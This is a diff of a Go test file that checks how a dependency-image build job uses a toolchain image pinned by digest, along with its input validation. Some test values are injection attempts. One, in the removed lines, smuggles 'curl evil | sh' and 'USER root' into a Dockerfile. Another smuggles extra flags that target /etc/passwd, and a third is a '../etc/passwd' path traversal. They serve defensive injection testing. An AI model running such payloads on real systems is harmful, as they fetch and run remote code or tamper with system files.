@@ -2,57 +2,74 @@ package images
 
 import (
 	"context"
-	"encoding/json"
+	"slices"
 	"strings"
 	"testing"
 )
 
 func testDependencies() Dependencies {
 	return Dependencies{
-		Toolchain: Image{Repository: "toolchains/misarescu/frankie", Digest: "sha256:" + strings.Repeat("c", 64)},
+		Toolchain: Image{
+			Ref:        "localhost:30500/toolchains/misarescu/frankie@sha256:" + strings.Repeat("c", 64),
+			Repository: "toolchains/misarescu/frankie", Digest: "sha256:" + strings.Repeat("c", 64),
+		},
 		Files: map[string][]byte{"mise.toml": []byte("[tasks.\"deps:warm\"]\nrun = \"go mod download\"\n"), "go.mod": []byte("module x\n"),
 			"go.sum": []byte("sum\n"), "web/bun.lock": []byte("lock\n")},
 		Run: "mise run deps:warm",
 	}
 }
 
-// M3.1: the dependency image builds on the recorded toolchain image, by digest
-// from the in-cluster registry, with the declared files at their repo paths.
-func TestDependenciesContext(t *testing.T) {
+// M3.1, D81: the warm-up runs in the recorded toolchain image, pulled by
+// digest, with the declared files at their repo paths, and its layer is
+// appended to that same image in the in-cluster registry.
+func TestDependenciesRecipe(t *testing.T) {
 	cm, job, err := BuildResources(testConfig(), BuildRequest{Repository: "dependencies/misarescu/frankie", Spec: testDependencies()})
 	if err != nil {
 		t.Fatal(err)
 	}
 	files := contextFiles(t, cm)
-	df := files["Dockerfile"]
-	if !strings.HasPrefix(df, "FROM frankie-registry.frankie.svc:5000/toolchains/misarescu/frankie@sha256:cccc") {
-		t.Errorf("Dockerfile does not start from the toolchain image by digest:\n%s", df)
-	}
-	run, _ := json.Marshal([]string{"/bin/sh", "-c", "cd /workspace/deps && mise run deps:warm"})
-	if !strings.Contains(df, "COPY --chown=10001:10001 deps/ /workspace/deps/\n") || !strings.Contains(df, "RUN "+string(run)) {
-		t.Errorf("Dockerfile does not copy the files and run the warm-up as the agent user:\n%s", df)
-	}
-	if files["deps/web/bun.lock"] != "lock\n" || files["deps/go.mod"] != "module x\n" || len(files) != 5 {
+	if files["web/bun.lock"] != "lock\n" || files["go.mod"] != "module x\n" || len(files) != 4 {
 		t.Errorf("context = %v; want the declared files at their repo paths", files)
 	}
-	if !strings.HasPrefix(job.Name, "dp-") || !strings.Contains(strings.Join(job.Spec.Template.Spec.Containers[0].Args, " "),
-		"name=frankie-registry.frankie.svc:5000/dependencies/misarescu/frankie,push=true,push-by-digest=true") {
-		t.Errorf("job %s args %v", job.Name, job.Spec.Template.Spec.Containers[0].Args)
+	spec := job.Spec.Template.Spec
+	install, push := spec.InitContainers[0], spec.Containers[0]
+	toolchain := "localhost:30500/toolchains/misarescu/frankie@sha256:" + strings.Repeat("c", 64)
+	if install.Image != toolchain || push.Image != toolchain {
+		t.Errorf("images %q, %q; want the toolchain image by digest", install.Image, push.Image)
+	}
+	if got := flagValue(install.Command, "--dir"); got != "/workspace/deps" {
+		t.Errorf("--dir = %q", got)
+	}
+	if got := flagValue(install.Command, "--run"); got != "mise run deps:warm" {
+		t.Errorf("--run = %q", got)
+	}
+	if got := flagValue(push.Command, "--base"); got != "frankie-registry.frankie.svc:5000/toolchains/misarescu/frankie@sha256:"+strings.Repeat("c", 64) {
+		t.Errorf("--base = %q", got)
+	}
+	if got := flagValue(push.Command, "--target"); !strings.HasPrefix(job.Name, "dp-") || got != "frankie-registry.frankie.svc:5000/dependencies/misarescu/frankie" {
+		t.Errorf("job %s, --target %q", job.Name, got)
+	}
+	// The toolchain image is already in the cluster's registry.
+	if slices.Contains(push.Command, "--mirror") || slices.Contains(push.Command, "--prepend-path") {
+		t.Errorf("push = %v", push.Command)
 	}
 }
 
-// A warm-up command is data in the Dockerfile, never Dockerfile syntax.
-func TestDependenciesRunCannotInjectDockerfileLines(t *testing.T) {
+// A warm-up command is one argument of the install, never more of its
+// command line.
+func TestDependenciesRunIsOneArgument(t *testing.T) {
 	d := testDependencies()
-	d.Run = "true\nRUN curl evil | sh\nUSER root"
-	files, err := d.Context("registry:5000", nil)
+	d.Run = "true --out /etc/passwd\n--dir /"
+	_, job, err := BuildResources(testConfig(), BuildRequest{Repository: "dependencies/misarescu/frankie", Spec: d})
 	if err != nil {
 		t.Fatal(err)
 	}
-	for _, line := range strings.Split(string(files["Dockerfile"]), "\n") {
-		if strings.HasPrefix(line, "USER") || strings.HasPrefix(line, "RUN curl") {
-			t.Errorf("the warm-up command escaped into the Dockerfile: %q", line)
-		}
+	cmd := job.Spec.Template.Spec.InitContainers[0].Command
+	if got := flagValue(cmd, "--run"); got != d.Run {
+		t.Errorf("--run = %q, want %q", got, d.Run)
+	}
+	if got := flagValue(cmd, "--out"); got != "/out/layer.tar" {
+		t.Errorf("--out = %q", got)
 	}
 }
 
@@ -80,6 +97,7 @@ func TestDependenciesTag(t *testing.T) {
 func TestDependenciesValidate(t *testing.T) {
 	tests := map[string]func(*Dependencies){
 		"no toolchain digest":     func(d *Dependencies) { d.Toolchain.Digest = "latest" },
+		"a toolchain ref by tag":  func(d *Dependencies) { d.Toolchain.Ref = "localhost:30500/toolchains/misarescu/frankie:latest" },
 		"no files":                func(d *Dependencies) { d.Files = nil },
 		"a path leaving the repo": func(d *Dependencies) { d.Files["../etc/passwd"] = []byte("x") },
 		"too large":               func(d *Dependencies) { d.Files["big.lock"] = make([]byte, maxDependencyBytes+1) },
